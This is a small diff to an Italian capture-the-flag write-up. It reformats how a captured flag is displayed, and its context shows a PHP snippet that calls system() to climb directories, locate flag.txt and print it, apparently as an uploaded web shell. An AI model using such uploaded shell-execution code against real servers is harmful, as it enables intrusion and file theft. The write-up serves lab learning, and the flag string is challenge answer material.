@@ -21,4 +21,7 @@ Si cerca di navigare fino alla radice tramite i comandi di sistema e si cerca il
 system('cd ..; cd ..; cd ..; cd ..; cd ..; find . -name "flag.txt"; ls; cat ./flag.txt')
 ?>
 ```
-Cliccando il link per aprire la risorsa viene eseguito il codice e si ottiene stampata a schermo la flag: **_flag{sh3l1_p0w3r_1s_k00p4_p0w3r}_**
+Cliccando il link per aprire la risorsa viene eseguito il codice e si ottiene stampata a schermo la flag:
+```
+flag{sh3l1_p0w3r_1s_k00p4_p0w3r}
+```
